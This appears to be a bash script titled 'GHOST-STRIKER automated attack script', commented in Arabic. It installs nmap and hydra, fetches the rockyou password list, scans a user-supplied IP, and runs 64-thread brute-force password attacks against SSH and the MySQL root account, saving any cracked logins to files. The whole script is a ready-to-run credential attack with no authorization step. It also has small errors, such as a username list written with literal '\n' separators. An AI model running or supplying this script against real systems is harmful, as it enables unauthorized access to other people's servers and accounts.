#!/bin/bash
# 
clear
echo "====================================================="
echo "   [!] GHOST-STRIKER AUTOMATED ATTACK SCRIPT [!]"
echo "      Targeting: Red Team Exploration Mode"
echo "====================================================="

# 1. تحديث النظام والتأكد من وجود الأدوات
echo "[+] Checking for dependencies and installing tools..."
sudo apt update -y && sudo apt upgrade -y
sudo apt install nmap hydra git curl gunzip -y

# 2. تنزيل قوائم كلمات المرور (SecLists & Rockyou)
WORDLIST_DIR="/usr/share/wordlists"
sudo mkdir -p $WORDLIST_DIR

echo "[+] Preparing Wordlists (Rockyou & SecLists)..."
if [ ! -f "$WORDLIST_DIR/rockyou.txt" ]; then
    sudo curl -L -o $WORDLIST_DIR/rockyou.txt.gz https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt.gz
    sudo gunzip $WORDLIST_DIR/rockyou.txt.gz
fi

# تنزيل قائمة أسماء مستخدمين شائعة
USER_LIST="$WORDLIST_DIR/users.txt"
if [ ! -f "$USER_LIST" ]; then
    echo "root\nadmin\nuser\nwebmaster\nsupport" > $USER_LIST
fi

# 3. سؤال المستخدم عن الهدف
echo ""
read -p "[?] Enter Target IP Address: " TARGET_IP

if [[ -z "$TARGET_IP" ]]; then
    echo "[!] Error: No IP entered. Exiting..."
    exit 1
fi

# 4. فحص سريع للمنافذ قبل الهجوم
echo "[+] Scanning Target: $TARGET_IP ..."
nmap -sV -p 21,22,3306 $TARGET_IP

echo "-----------------------------------------------------"
echo "[!] STARTING BRUTEFORCE ATTACK (Aggressive Mode)"
echo "[!] Threads: 64 | Speed: Maximum"
echo "-----------------------------------------------------"

# 5. بدء هجوم Hydra على الـ SSH و MySQL بشكل متتابع
echo "[>] Attacking SSH (Port 22)..."
hydra -L $USER_LIST -P $WORDLIST_DIR/rockyou.txt -t 64 -vV -f $TARGET_IP ssh -o ssh_success.txt

echo ""
echo "[>] Attacking MySQL (Port 3306)..."
hydra -l root -P $WORDLIST_DIR/rockyou.txt -t 64 -vV -f mysql://$TARGET_IP -o mysql_success.txt

echo "====================================================="
echo "[+] Attack Sequence Finished."
echo "[+] Check 'ssh_success.txt' or 'mysql_success.txt' for results."
echo "====================================================="
